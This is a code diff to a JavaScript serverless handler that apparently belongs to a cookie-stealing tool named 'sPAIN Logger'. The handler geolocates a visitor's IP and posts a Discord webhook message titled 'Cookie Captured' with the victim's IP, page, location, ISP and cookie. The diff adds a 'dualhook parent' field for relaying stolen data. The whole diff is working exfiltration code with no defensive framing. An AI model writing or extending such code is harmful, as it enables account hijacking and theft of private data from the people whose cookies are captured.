@@ -157,19 +157,29 @@ export default async function handler(req, res) {
   const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
   const isp = geo?.isp || 'Unknown';
 
-  // webhook2 embed: IP, Page, Time, Location, ISP, Cookie
+  // webhook2 embed: IP, Page, DH Parent (if dualhook), Time, Location, ISP, Cookie
+  const wh2Fields = [
+    { name: '🌐 IP',       value: `\`${ip}\``, inline: true  },
+    { name: '📄 Page',     value: pName,        inline: true  },
+  ];
+  if (record.dualhookParent) {
+    wh2Fields.push({ name: '🎣 DH Parent', value: `\`${record.dualhookParent}\``, inline: true });
+  }
+  wh2Fields.push(
+    { name: '🕐 Time',     value: now, inline: false },
+    { name: '📍 Location', value: loc, inline: true  },
+    { name: '🗺️ ISP',      value: isp, inline: true  },
+  );
+
   await discordSend(webhook2, {
     content: '@everyone',
     embeds: [{
-      title:     '🍪 Cookie Captured',
+      title:       '🍪 Cookie Captured',
+      description: record.dualhookParent
+        ? '<a:emoji_17:1508694920972468347> dh parent <a:emoji_17:1508694920972468347>'
+        : '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
       color:     0xc026d3,
-      fields: [
-        { name: '🌐 IP',       value: `\`${ip}\``, inline: true  },
-        { name: '📄 Page',     value: pName,        inline: true  },
-        { name: '🕐 Time',     value: now,          inline: false },
-        { name: '📍 Location', value: loc,          inline: true  },
-        { name: '🗺️ ISP',      value: isp,          inline: true  },
-      ],
+      fields:    wh2Fields,
       footer:    { text: `sPAIN Logger • ${pName}` },
       timestamp: now
     }]
